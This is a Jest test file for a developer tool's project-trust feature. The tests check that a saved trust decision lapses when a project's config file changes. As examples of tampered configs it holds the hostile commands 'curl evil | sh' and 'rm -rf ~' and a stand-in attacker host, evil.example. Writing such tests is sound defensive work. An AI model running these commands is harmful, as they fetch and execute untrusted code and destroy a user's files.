import fs from 'fs'
import type os from 'os'
import path from 'path'
import { BETTY_HOME_DIR } from './constants'
import { isProjectTrusted, trustProject } from './projectTrust'

jest.mock('./constants', () => {
  /* eslint-disable @typescript-eslint/no-require-imports */
  const p = require('path') as typeof path
  const o = require('os') as typeof os
  /* eslint-enable @typescript-eslint/no-require-imports */
  return { BETTY_HOME_DIR: p.join(o.tmpdir(), `betty-trust-test-${String(process.pid)}`) }
})

describe('project trust', () => {
  const config = {
    project: 'shop',
    up: { command: 'docker compose up -d' },
    domains: [{ host: 'shop.dev', target: 'http://127.0.0.1:3000' }],
    permissions: { hosts: 'allowed' },
  }
  const configPath = path.join(BETTY_HOME_DIR, 'repo', '.betty.yml')

  beforeEach(() => { fs.rmSync(BETTY_HOME_DIR, { recursive: true, force: true }) })
  afterAll(() => { fs.rmSync(BETTY_HOME_DIR, { recursive: true, force: true }) })

  test('trusts nothing at first', () => {
    expect(isProjectTrusted(configPath, config)).toBe(false)
  })

  test('remembers a trusted file', () => {
    trustProject(configPath, config)
    expect(isProjectTrusted(configPath, config)).toBe(true)
  })

  test.each([
    ['the start command', { ...config, up: { command: 'curl evil | sh' } }],
    ['a target', { ...config, domains: [{ host: 'shop.dev', target: 'http://evil.example' }] }],
    ['a permission', { ...config, permissions: { hosts: 'allowed', docker: 'allowed' } }],
    ['the stop command', { ...config, down: { command: 'rm -rf ~' } }],
  ])('asks again once %s changes', (_what, changed) => {
    trustProject(configPath, config)
    expect(isProjectTrusted(configPath, changed)).toBe(false)
  })

  test('trusts per file: the same content elsewhere is not trusted', () => {
    trustProject(configPath, config)
    expect(isProjectTrusted(path.join(BETTY_HOME_DIR, 'other', '.betty.yml'), config)).toBe(false)
  })

  test('keeps other trusted files when trusting one more', () => {
    const other = path.join(BETTY_HOME_DIR, 'other', '.betty.yml')
    trustProject(configPath, config)
    trustProject(other, config)
    expect(isProjectTrusted(configPath, config)).toBe(true)
    expect(isProjectTrusted(other, config)).toBe(true)
  })

  test('treats an unreadable trust file as trusting nothing', () => {
    fs.mkdirSync(BETTY_HOME_DIR, { recursive: true })
    fs.writeFileSync(path.join(BETTY_HOME_DIR, 'trusted-projects.json'), '{ broken', 'utf8')
    expect(isProjectTrusted(configPath, config)).toBe(false)
    trustProject(configPath, config)
    expect(isProjectTrusted(configPath, config)).toBe(true)
  })
})
